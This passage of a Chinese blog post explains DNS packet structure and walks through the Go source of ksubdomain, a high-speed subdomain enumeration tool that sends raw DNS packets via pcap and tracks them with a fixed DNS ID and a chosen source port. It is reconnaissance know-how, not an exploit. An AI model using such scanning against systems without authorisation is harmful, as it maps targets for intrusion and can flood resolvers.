。</p><p>DNS 问题部分由一组问题记录组成，包含如下内容：</p><ul><li>待查询域名 <code>(name)</code></li><li>查询类型 <code>(type)</code></li><li>查询类别 <code>(class)</code></li></ul><p>查询类型：</p><table><thead><tr><th align="left">查询类型</th><th align="left">名称代码</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">A</td><td align="left">IPv4地址</td></tr><tr><td align="left">2</td><td align="left">NS</td><td align="left">名称服务器</td></tr><tr><td align="left">5</td><td align="left">CNAME</td><td align="left">规范名称</td></tr><tr><td align="left">15</td><td align="left">MX</td><td align="left">电子邮件交互</td></tr><tr><td align="left">16</td><td align="left">TXT</td><td align="left">文本信息</td></tr><tr><td align="left">28</td><td align="left">AAAA</td><td align="left">IPv6地址</td></tr></tbody></table><p>查询类别：取 1 时表示 Internet 协议</p><h4 id="资源记录"><a href="#资源记录" class="headerlink" title="资源记录"></a>资源记录</h4><p>服务端处理查询请求后，需要向客户端发送应答报文；域名查询结果作为资源记录，保存在答案以及其后两节中。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309151737291.png?imageSlim" alt="img"></p><p>资源记录结构和问题记录非常相似，它总共有 6 个字段，前 3 个和问题记录完全一样：</p><ul><li>被查询域名</li><li>查询类型</li><li>类</li><li>有效期 <code>(TTL)</code>：域名记录一般不会频繁改动，所以在有效期内可以将结果缓存起来，降低请求频率；</li><li>数据长度 <code>(Resource Data Length)</code>：即查询结果的长度；</li><li>数据 <code>(Resource Data)</code> ：即查询结果；</li></ul><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>请求报文：问题这里就是 <code>baidu.com</code> 的 A 记录：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309151926753.png?imageSlim" alt="image-20230915192613680"></p><p>响应报文：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309151926384.png?imageSlim" alt="image-20230915192659251"></p><h2 id="项目介绍-1"><a href="#项目介绍-1" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ksubdomain 使用 pcap 发包和接收数据，会直接将数据包发送至网卡，不经过系统，使速度大大提升。</p><p>由于又是 udp 协议，数据包丢失的情况很多，所以 ksubdomain 在程序中建立了“状态表”，用于检测数据包的状态，当数据包发送时，会记录下状态，当收到了这个数据包的回应时，会从状态表去除，如果一段时间发现数据包没有动作，便可以认为这个数据包已经丢失了，于是会进行重发，当重发到达一定次数时，就可以舍弃该数据包了。</p><p>上面说 ksubdomain 是无状态发包，如何建立确认状态呢？</p><p>根据 DNS 协议和 UDP 协议的一些特点，DNS 协议中 ID 字段，UDP 协议中 SrcPort 字段可以携带数据，在我们收到返回包时，这些字段的数据不会改变。所以利用这些字段的值来确认这个包是我们需要的，并且找到状态表中这个包的位置。</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">D:.<br>│  ksubdomain.yaml# 网卡配置信息<br>├─cmd# 命令参数相关<br>│  └─ksubdomain<br>│          cmd.go<br>│          enum.go# 枚举模式<br>│          test.go# 测试本地网卡的最大发送速度<br>│          verify.go# 验证模式<br>├─core<br>│  │  banner.go# Banner 信息<br>│  │  subdata.go# 子域名相关(内嵌,获取切片)<br>│  │  util.go# 工具类<br>│  │  wildcard.go# 泛解析域名判断<br>│  ├─device<br>│  │      device.go# 获取网卡信息,初始化 pcap<br>│  │      struct.go<br>│  ├─dns<br>│  │      ns.go# NS 记录<br>│  │      ns_test.go<br>│  ├─gologger<br>│  │      gologger.go# 日志<br>│  └─options<br>│          options.go# 配置信息及相关方法<br>└─runner<br>    │  recv.go# 捕获数据包并获取其中的答案记录<br>    │  result.go# 结果相关<br>    │  retry.go# 超时重置机制<br>    │  runner.go# 枚举主函数<br>    │  send.go# 使用 gopacket 发送自定义的 DSN 数据包<br>    │  testspeed.go# 测试本地网卡的最大发送速度<br>    │  wildcard.go# 泛解析过滤<br>    ├─outputter# 输出相关<br>    ├─processbar# 过程(成功,失败...)<br>    ├─result# 结果结构体<br>    └─statusdb# 使用 sync.Map 实现一个内存简易读写数据库<br></code></pre></td></tr></table></figure><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>枚举模块大致流程：</p><ol><li>根据根域名及前缀拼接获取总子域名</li><li>通过请求域名然后捕获数据包提取本机的网卡信息</li><li>启动接收线程 ，启动发送线程 ，启动输出线程</li><li>向发送线程中传入总子域名目标</li><li>发送完成后启动重试机制的线程</li><li>然后就是一个死的 <code>for</code> 循环 + <code>select...case</code>，定时检测目标是否检测完成</li><li>检测完成，退出各个线程，关闭各通道</li></ol><p><code>enum.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 获取网卡配置</span><br>opt.EtherInfo = options.GetDeviceConfig()<br>ctx := context.Background()<br><span class="hljs-comment">// 创建一个 runner</span><br>r, err := runner.New(opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    gologger.Fatalf(<span class="hljs-string">&quot;%s\n&quot;</span>, err.Error())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// 启动枚举</span><br>r.RunEnumeration(ctx)<br>r.Close()<br></code></pre></td></tr></table></figure><p>先看下获取网卡配置：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309162132121.png?imageSlim" alt="image-20230916213233036"></p><p>主要是 <code>device.AutoGetDevices()</code> ：</p><p>这个主要就是去使用 <code>net.LookupHost(domain)</code> 发起一个 DNS 请求，然后抓网卡包获取 DNS 数据包且问题为 <code>domain</code> 的，然后从它的 <code>Ethernet </code> 获取信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AutoGetDevices</span><span class="hljs-params">()</span></span> *EtherTable &#123;<br>domain := core.RandomStr(<span class="hljs-number">4</span>) + <span class="hljs-string">&quot;.i.hacking8.com&quot;</span><br>signal := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *EtherTable)<br><span class="hljs-comment">// 获取所有设备</span><br>devices, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Fatalf(<span class="hljs-string">&quot;获取网络设备失败:%s\n&quot;</span>, err.Error())<br>&#125;<br>data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]net.IP)<br>keys := []<span class="hljs-type">string</span>&#123;&#125;<br><span class="hljs-comment">// 获取 ipv4 且不是回环地址的设备名称</span><br><span class="hljs-keyword">for</span> _, d := <span class="hljs-keyword">range</span> devices &#123;<br><span class="hljs-keyword">for</span> _, address := <span class="hljs-keyword">range</span> d.Addresses &#123;<br>ip := address.IP<br><span class="hljs-keyword">if</span> ip.To4() != <span class="hljs-literal">nil</span> &amp;&amp; !ip.IsLoopback() &#123;<br>data[d.Name] = ip<br>keys = <span class="hljs-built_in">append</span>(keys, d.Name)<br>&#125;<br>&#125;<br>&#125;<br>ctx := context.Background()<br><span class="hljs-comment">// 在初始上下文的基础上创建一个有取消功能的上下文</span><br>ctx, cancel := context.WithCancel(ctx)<br><span class="hljs-keyword">for</span> _, drviceName := <span class="hljs-keyword">range</span> keys &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(drviceName <span class="hljs-type">string</span>, domain <span class="hljs-type">string</span>, ctx context.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> (<br>snapshot_len <span class="hljs-type">int32</span>         = <span class="hljs-number">1024</span><br>promiscuous  <span class="hljs-type">bool</span>          = <span class="hljs-literal">false</span><br>timeout      time.Duration = <span class="hljs-number">-1</span> * time.Second<br>handle       *pcap.Handle<br>)<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// 使用 pcap.OpenLive 打开设备的抓包会话</span><br>handle, err = pcap.OpenLive(<br>drviceName,   <span class="hljs-comment">// 设备名</span><br>snapshot_len, <span class="hljs-comment">// 捕获数据包的最大长度</span><br>promiscuous,  <span class="hljs-comment">// 不启用混杂模式 ( 只要发给自己的数据包 )</span><br>timeout,      <span class="hljs-comment">// 超时机制, -1 则一直等待重试</span><br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Errorf(<span class="hljs-string">&quot;pcap打开失败:%s\n&quot;</span>, err.Error())<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br><span class="hljs-comment">// Use the handle as a packet source to process all packets</span><br><span class="hljs-comment">// 创建一个数据包源，用于处理所有捕获到的数据包</span><br>packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// 获取一个数据包</span><br>packet, err := packetSource.NextPacket()<br>gologger.Printf(<span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 检查数据包是否包含 DNS 层</span><br><span class="hljs-keyword">if</span> dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != <span class="hljs-literal">nil</span> &#123;<br>dns, _ := dnsLayer.(*layers.DNS)<br><span class="hljs-comment">// 判断是否为应答报文</span><br><span class="hljs-keyword">if</span> !dns.QR &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> dns.Questions &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-type">string</span>(v.Name) == domain &#123;<br>ethLayer := packet.Layer(layers.LayerTypeEthernet)<br><span class="hljs-keyword">if</span> ethLayer != <span class="hljs-literal">nil</span> &#123;<br>eth := ethLayer.(*layers.Ethernet)<br><span class="hljs-comment">// 获取信息</span><br>etherTable := EtherTable&#123;<br>SrcIp:  data[drviceName],<br>Device: drviceName,<br>SrcMac: SelfMac(eth.DstMAC),<br>DstMac: SelfMac(eth.SrcMAC),<br>&#125;<br>signal &lt;- &amp;etherTable<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;(drviceName, domain, ctx)<br>&#125;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-comment">// 获取配置信息后退出协程</span><br><span class="hljs-keyword">case</span> c := &lt;-signal:<br>cancel()<br>fmt.Print(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-keyword">return</span> c<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// 发起 DNS 请求, 从数据包中获取硬件信息</span><br>_, _ = net.LookupHost(domain)<br>time.Sleep(time.Second * <span class="hljs-number">1</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runner.New(opt)</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(opt *options.Options)</span></span> (*runner, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>version := pcap.Version()<br>r := <span class="hljs-built_in">new</span>(runner)<br>gologger.Infof(version + <span class="hljs-string">&quot;\n&quot;</span>)<br>r.options = opt<br>r.hm = statusdb.CreateMemoryDB()<br>gologger.Infof(<span class="hljs-string">&quot;Default DNS:%s\n&quot;</span>, core.SliceToString(opt.Resolvers))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(opt.SpecialResolvers) &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> keys []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> k, _ := <span class="hljs-keyword">range</span> opt.SpecialResolvers &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, k)<br>&#125;<br>gologger.Infof(<span class="hljs-string">&quot;Special DNS:%s\n&quot;</span>, core.SliceToString(keys))<br>&#125;<br><span class="hljs-comment">// 打开 Pcap 捕获数据包</span><br>r.handle, err = device.PcapInit(opt.EtherInfo.Device)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 根据发包总数和 timeout 时间来分配每秒速度</span><br>allPacket := opt.DomainTotal<br>calcLimit := <span class="hljs-type">float64</span>(allPacket/opt.TimeOut) * <span class="hljs-number">0.85</span><br><span class="hljs-keyword">if</span> calcLimit &lt; <span class="hljs-number">5000</span> &#123;<br>calcLimit = <span class="hljs-number">5000</span><br>&#125;<br>limit := <span class="hljs-type">int</span>(math.Min(calcLimit, <span class="hljs-type">float64</span>(opt.Rate)))<br><span class="hljs-comment">// 限制单位时间内允许通过的请求数目</span><br>r.limit = ratelimit.New(limit)<br>gologger.Infof(<span class="hljs-string">&quot;Domain Count:%d\n&quot;</span>, r.options.DomainTotal)<br>gologger.Infof(<span class="hljs-string">&quot;Rate:%dpps\n&quot;</span>, limit)<br><br>r.sender = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">99</span>)        <span class="hljs-comment">// 协程发送缓冲</span><br>r.recver = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> result.Result, <span class="hljs-number">99</span>) <span class="hljs-comment">// 协程接收缓冲</span><br><span class="hljs-comment">// 获取一个空闲的端口</span><br>freePort, err := freeport.GetFreePort()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 获取 layers 类型</span><br>r.dnsType, err = options.DnsType(opt.DnsType)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>r.freeport = freePort<br>gologger.Infof(<span class="hljs-string">&quot;FreePort:%d\n&quot;</span>, freePort)<br>r.dnsid = <span class="hljs-number">0x2021</span> <span class="hljs-comment">// set dnsid 65500</span><br>r.maxRetry = opt.Retry<br>r.timeout = <span class="hljs-type">int64</span>(opt.TimeOut)<br>r.fisrtloadChanel = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br>r.startTime = time.Now()<br><span class="hljs-keyword">return</span> r, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是一个 <code>RunEnumeration</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> RunEnumeration(ctx context.Context) &#123;<br>ctx, cancel := context.WithCancel(ctx)<br><span class="hljs-keyword">defer</span> cancel()<br><span class="hljs-keyword">go</span> r.recvChanel(ctx) <span class="hljs-comment">// 启动接收线程</span><br><span class="hljs-keyword">go</span> r.sendCycle()     <span class="hljs-comment">// 启动发送线程</span><br><span class="hljs-keyword">go</span> r.handleResult()  <span class="hljs-comment">// 处理结果，打印输出</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 向发送线程中传入目标域名</span><br><span class="hljs-keyword">for</span> domain := <span class="hljs-keyword">range</span> r.options.Domain &#123;<br>r.sender &lt;- domain<br>&#125;<br>r.fisrtloadChanel &lt;- <span class="hljs-string">&quot;ok&quot;</span><br>&#125;()<br><span class="hljs-keyword">var</span> isLoadOver <span class="hljs-type">bool</span> = <span class="hljs-literal">false</span><br><span class="hljs-comment">// 1s 定时器</span><br>t := time.NewTicker(<span class="hljs-number">1</span> * time.Second)<br><span class="hljs-keyword">defer</span> t.Stop()<br><span class="hljs-comment">// 等待协程运行完成</span><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-comment">// 每秒都发送一次, 判断是否完成</span><br>        <span class="hljs-comment">// 完成之后 return 出 for 循环, defer cancel() 退出接收协程 </span><br><span class="hljs-keyword">case</span> &lt;-t.C:<br>r.printStatus()<br><span class="hljs-keyword">if</span> isLoadOver &#123;<br><span class="hljs-keyword">if</span> r.hm.Length() &lt;= <span class="hljs-number">0</span> &#123;<br>gologger.Printf(<span class="hljs-string">&quot;\n&quot;</span>)<br>gologger.Infof(<span class="hljs-string">&quot;扫描完毕&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 目标域名发送完成后就开始进行重试测试</span><br><span class="hljs-keyword">case</span> &lt;-r.fisrtloadChanel:<br><span class="hljs-keyword">go</span> r.retry(ctx)<br>isLoadOver = <span class="hljs-literal">true</span><br><span class="hljs-comment">// 程序结束</span><br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>sendCycle() </code>，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> sendCycle() &#123;<br><span class="hljs-keyword">for</span> domain := <span class="hljs-keyword">range</span> r.sender &#123;<br><span class="hljs-comment">// 启动速率限制</span><br>r.limit.Take()<br><span class="hljs-comment">// 判断是否为重试的目标</span><br>v, ok := r.hm.Get(domain)<br><span class="hljs-keyword">if</span> !ok &#123;<br>v = statusdb.Item&#123;<br>Domain:      domain,<br>                <span class="hljs-comment">// 获取一个随机的 DNS 服务器地址, 或者根据域名获取特殊的 DNS 服务器地址</span><br>Dns:         r.choseDns(domain),<br>Time:        time.Now(),<br>Retry:       <span class="hljs-number">0</span>,<br>DomainLevel: <span class="hljs-number">0</span>,<br>&#125;<br>r.hm.Add(domain, v)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 重试次数 +1</span><br>v.Retry += <span class="hljs-number">1</span><br>v.Time = time.Now()<br>v.Dns = r.choseDns(domain)<br>r.hm.Set(domain, v)<br>&#125;<br><span class="hljs-comment">// 发送操作</span><br>send(domain, v.Dns, r.options.EtherInfo, r.dnsid, <span class="hljs-type">uint16</span>(r.freeport), r.handle, r.dnsType)<br><span class="hljs-comment">// 并发安全的计数器 +1</span><br>atomic.AddUint64(&amp;r.sendIndex, <span class="hljs-number">1</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下 <code>send</code> 使用<code>pacp</code> 网卡进行发包：</p><p>其实就是模拟一个 DNS 协议的包，然后在 DNS 的 ID 字段携带一个标识，这个就是用来区分是否为 Ksubdomain 发送的请求包。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// send 使用 gopacket 去发送数据包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">send</span><span class="hljs-params">(domain <span class="hljs-type">string</span>, dnsname <span class="hljs-type">string</span>, ether *device.EtherTable, dnsid <span class="hljs-type">uint16</span>, freeport <span class="hljs-type">uint16</span>, handle *pcap.Handle, dnsType layers.DNSType)</span></span> &#123;<br>    <span class="hljs-comment">// dns 服务器地址</span><br>DstIp := net.ParseIP(dnsname).To4()<br>eth := &amp;layers.Ethernet&#123;<br>SrcMAC:       ether.SrcMac.HardwareAddr(),<br>DstMAC:       ether.DstMac.HardwareAddr(),<br>EthernetType: layers.EthernetTypeIPv4,<br>&#125;<br><span class="hljs-comment">// Our IPv4 header</span><br>ip := &amp;layers.IPv4&#123;<br>Version:    <span class="hljs-number">4</span>,<br>IHL:        <span class="hljs-number">5</span>,<br>TOS:        <span class="hljs-number">0</span>,<br>Length:     <span class="hljs-number">0</span>, <span class="hljs-comment">// FIX</span><br>Id:         <span class="hljs-number">0</span>,<br>Flags:      layers.IPv4DontFragment,<br>FragOffset: <span class="hljs-number">0</span>,<br>TTL:        <span class="hljs-number">255</span>,<br>Protocol:   layers.IPProtocolUDP,<br>Checksum:   <span class="hljs-number">0</span>,<br>SrcIP:      ether.SrcIp,<br>DstIP:      DstIp,<br>&#125;<br><span class="hljs-comment">// Our UDP header</span><br>udp := &amp;layers.UDP&#123;<br>SrcPort: layers.UDPPort(freeport),<br>DstPort: layers.UDPPort(<span class="hljs-number">53</span>),<br>&#125;<br><span class="hljs-comment">// Our DNS header</span><br>dns := &amp;layers.DNS&#123;<br>        <span class="hljs-comment">// Ksubdomain 的标识 0x2021 </span><br>ID:      dnsid,<br>QDCount: <span class="hljs-number">1</span>,<br>RD:      <span class="hljs-literal">true</span>, <span class="hljs-comment">//递归查询标识</span><br>&#125;<br>dns.Questions = <span class="hljs-built_in">append</span>(dns.Questions,<br>layers.DNSQuestion&#123;<br>Name:  []<span class="hljs-type">byte</span>(domain),<br>Type:  dnsType,<br>Class: layers.DNSClassIN,<br>&#125;)<br><span class="hljs-comment">// Our UDP header</span><br>_ = udp.SetNetworkLayerForChecksum(ip)<br>buf := gopacket.NewSerializeBuffer()<br>    <span class="hljs-comment">// 把所有层序列化到缓冲区中</span><br>err := gopacket.SerializeLayers(<br>buf,<br>gopacket.SerializeOptions&#123;<br>ComputeChecksums: <span class="hljs-literal">true</span>, <span class="hljs-comment">// automatically compute checksums</span><br>FixLengths:       <span class="hljs-literal">true</span>,<br>&#125;,<br>eth, ip, udp, dns,<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Warningf(<span class="hljs-string">&quot;SerializeLayers faild:%s\n&quot;</span>, err.Error())<br>&#125;<br>    <span class="hljs-comment">// 发送</span><br>err = handle.WritePacketData(buf.Bytes())<br><span 